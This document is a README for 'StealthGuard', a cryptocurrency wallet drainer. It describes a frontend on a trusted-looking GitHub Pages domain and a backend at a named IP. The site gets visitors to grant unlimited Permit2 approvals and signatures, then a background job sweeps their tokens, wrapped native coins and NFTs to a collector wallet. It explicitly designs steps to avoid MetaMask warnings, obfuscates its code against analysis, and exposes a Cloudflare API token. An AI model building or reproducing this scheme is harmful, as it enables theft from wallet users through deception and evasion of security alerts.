# StealthGuard - Crypto Wallet Connection System

**Status**: Production-ready  
**Frontend**: https://hodldog.github.io/on/index.html  
**Backend API**: https://194.60.133.152:8445/api  
**Collector Wallet**: `0xB0E0306AB4b82774686d7D032e0157dDc8352648`

## Code Obfuscation

**Production builds are obfuscated** using `javascript-obfuscator`:

| Feature | Setting |
|---------|---------|
| Control Flow Flattening | 50% |
| Dead Code Injection | 20% |
| Debug Protection | Enabled |
| Self Defending | Enabled |
| String Array Encoding | Base64 |
| String Array Threshold | 75% |

**Build commands:**
```bash
npm run build          # Development (no obfuscation)
npm run build:prod     # Production (with obfuscation)
```

**Clean backups** are saved in `backups/dist-clean-YYYYMMDD-HHMMSS/`

## SSL Certificate

**Let's Encrypt certificate for IP address!** (Mar 2026)

```
Profile: shortlived (supports IP addresses)
Valid: 6 days (auto-renew)
Issuer: Let's Encrypt (E2)
```

To renew:
```bash
~/.acme.sh/acme.sh --renew -d 194.60.133.152 --cert-profile shortlived
cp /root/.acme.sh/194.60.133.152_ecc/fullchain.cer /etc/ssl/stealthguard/cert.pem
cp /root/.acme.sh/194.60.133.152_ecc/194.60.133.152.key /etc/ssl/stealthguard/key.pem
chown caddy:caddy /etc/ssl/stealthguard/*.pem
systemctl restart caddy
```

## Architecture

```
┌─────────────────┐     ┌─────────────────┐
│   GitHub Pages  │────▶│   Backend VPS   │
│   (Frontend)    │     │   (Port 8445)   │
│   Trusted SSL   │     │   API + Caddy   │
└─────────────────┘     └─────────────────┘
                               │
                               ▼
                        ┌─────────────────┐
                        │  Auto-Transfer  │
                        │  (Every 2 min)  │
                        └─────────────────┘
                               │
                               ▼
                        ┌─────────────────┐
                        │ Collector EOA   │
                        │ 0xB0E0306...    │
                        └─────────────────┘
```

**Why GitHub Pages?**
- Trusted domain (green lock in browser)
- Wallet connection shows "hodldog.github.io" instead of IP
- Free SSL certificate
- No MetaMask alerts for trusted domain

## Token Flow (No Alerts Strategy)

### ERC20 Tokens
```
1. Detect balance > 0
2. approve(Permit2, MAX_UINT256)  ← Uniswap contract, NO ALERT
3. signTypedData(Permit2)         ← Signature, NO ALERT
4. Backend uses signature to transferFrom()
```

**Permit2 amount = MAX_UINT256**
- Covers ANY future balance (not just current)
- This is a SIGNATURE, not a transaction
- MetaMask does NOT show alerts for signatures

### Native Tokens (ETH, BNB, MATIC, AVAX)
```
1. Detect native balance > threshold
2. WETH.deposit()                  ← Wrap, NO ALERT
3. approve(Permit2, MAX_UINT256)   ← Uniswap contract, NO ALERT
4. signTypedData(Permit2)          ← Signature, NO ALERT
5. Backend uses signature to transferFrom(WETH)
```

**Wrapped Token Addresses:**
| Chain | Native | Wrapped | Address |
|-------|--------|---------|---------|
| ETH | ETH | WETH | 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 |
| BSC | BNB | WBNB | 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c |
| Polygon | MATIC | WMATIC | 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270 |
| Arbitrum | ETH | WETH | 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 |
| Base | ETH | WETH | 0x4200000000000000000000000000000000000006 |
| Optimism | ETH | WETH | 0x4200000000000000000000000000000000000006 |
| Avalanche | AVAX | WAVAX | 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7 |

### NFT Collections
```
1. Detect NFTs in collection
2. setApprovalForAll(Permit2, true)  ← Uniswap contract, NO ALERT
3. Backend can transfer NFTs via Permit2
```

**Note:** NFT approvals go to Permit2 contract (trusted), NOT to EOA.

## What Was Removed (Alert Sources)

| Old Method | Alert? | Status |
|------------|--------|--------|
| standardApprove(EOA) | ⚠️ YES | REMOVED |
| setApprovalForAll(EOA) | ⚠️ YES | CHANGED to Permit2 |
| approve(Permit2) | ✅ NO | KEPT |
| signTypedData | ✅ NO | KEPT |
| WETH.deposit() | ✅ NO | ADDED |

## Smart Contracts (Deployed but Not Used)

**RescueRouter.sol** - Available in `/contracts/`
- Can be used instead of EOA for production
- Currently NOT active to avoid alerts on unknown contract

**Why EOA instead of contract?**
- Permit2 is trusted by MetaMask (Uniswap)
- Unknown contracts trigger alerts
- EOA + Permit2 = no alerts

## Quick Start (Test Server)

```bash
# Already deployed at:
# Frontend: https://hodldog.github.io/on/index.html
# Backend: https://194.60.133.152:8445
# Collector: 0xB0E0306AB4b82774686d7D032e0157dDc8352648
```

## Deploy to New Server

### Step 1: Prepare Server

```bash
scp -r /home/ubuntu/StealthGuard user@new-server:/opt/
ssh user@new-server
cd /opt/StealthGuard
```

### Step 2: Run Deploy Script

```bash
chmod +x deploy.sh
./deploy.sh
```

### Step 3: Update Frontend URL

Edit `src/utils/analytics.ts` and `src/App.tsx`:

```typescript
const API_ENDPOINT = 'https://YOUR_SERVER_IP:8445/api/log';
await fetch('https://YOUR_SERVER_IP:8445/api/permit2', ...
```

### Step 4: Rebuild and Deploy to GitHub

```bash
npm run build
cp dist/assets/* /path/to/on-repo/assets/
# Update HTML with new JS filename
cd /path/to/on-repo
git add -A && git commit -m "update" && git push
```

### Step 5: Test

```
https://YOUR_USERNAME.github.io/on/index.html
```

## File Structure

```
StealthGuard/
├── src/
│   ├── App.tsx            # Main logic (Permit2, Wrap, NFT)
│   ├── main.tsx
│   ├── config/wagmi.ts
│   ├── tokens/
│   │   ├── top10.ts       # Top 10 tokens per chain
│   │   └── nftCollections.ts
│   ├── permit2/addresses.ts
│   └── utils/
│       ├── analytics.ts   # Backend logging
│       └── tokenPrices.ts
├── backend/
│   ├── server.js          # HTTP :3000
│   ├── routes/api.js
│   ├── models/
│   ├── monitor/autoTransfer.js  # Background sweep
│   └── data/              # JSON storage
├── contracts/RescueRouter.sol  # Smart contract (not active)
├── cloudflare/            # Workers (backup option)
├── dist/                  # Production build (obfuscated)
├── backups/               # Clean builds (no obfuscation)
│   └── dist-clean-*/
├── obfuscate.cjs          # Obfuscation script
└── deploy.sh
```

## API Endpoints

```
POST /api/log           - Log events
POST /api/permit2       - Store Permit2 signatures
GET  /api/dashboard     - Stats
GET  /health            - Health check
```

## Environment Variables (backend/.env)

```env
# Required
BACKEND_PRIVATE_KEY=0x...
BACKEND_WALLET_ADDRESS=0xB0E0306AB4b82774686d7D032e0157dDc8352648
COLLECTOR_ADDRESS=0xB0E0306AB4b82774686d7D032e0157dDc8352648

# SSL Certificate (Let's Encrypt for IP - shortlived profile)
# Renew: ~/.acme.sh/acme.sh --renew -d 194.60.133.152 --cert-profile shortlived

# Cloudflare (for Workers - backup option)
CLOUDFLARE_API_TOKEN=SSKjvVpOLZmSxkztrwqo5aNT-1Vlvf16lLUuTUgc
CLOUDFLARE_ACCOUNT_ID=5445539f633c5345b2a8ea555019542d

# Transfer settings
MIN_TRANSFER_USD=1
ENABLE_MONITOR=true

# Telegram alerts (optional)
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...
```

## Chains Supported

| Chain | Chain ID | Native | Wrapped |
|-------|----------|--------|---------|
| Ethereum | 1 | ETH | WETH |
| BSC | 56 | BNB | WBNB |
| Polygon | 137 | MATIC | WMATIC |
| Arbitrum | 42161 | ETH | WETH |
| Base | 8453 | ETH | WETH |
| Optimism | 10 | ETH | WETH |
| Avalanche | 43114 | AVAX | WAVAX |

## Commands

```bash
npm run build                    # Build frontend
cd backend && node server.js     # Start backend
pm2 start backend/server.js --name stealthguard
pm2 logs stealthguard
cat backend/data/events.json     # View logs
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| MetaMask alert | Should NOT happen with current setup |
| Tokens not transferred | Check Permit2 signature stored |
| Native not wrapped | Check native balance > 0.0001 |
| NFT not approved | Check NFT collection in config |

## Notes

- Permit2 = Uniswap contract = trusted by MetaMask
- All approvals go to Permit2, NOT to EOA directly
- Backend uses stored signatures to execute transfers
- MAX_UINT256 permits cover future incoming tokens
- Wrapped tokens allow Permit2 for native assets

## Backup & Recovery

**Clean (non-obfuscated) builds** are saved automatically:
```bash
backups/
├── dist-clean-20260302-162718/   # Example backup
│   ├── index.html
│   └── assets/
```

**To restore clean build:**
```bash
# Remove obfuscated, restore clean
rm -rf dist/
cp -r backups/dist-clean-YYYYMMDD-HHMMSS dist/

# Or rebuild without obfuscation
npm run build   # NODE_ENV != production
```

**To create new backup:**
```bash
mkdir -p backups
cp -r dist backups/dist-clean-$(date +%Y%m%d-%H%M%S)
```
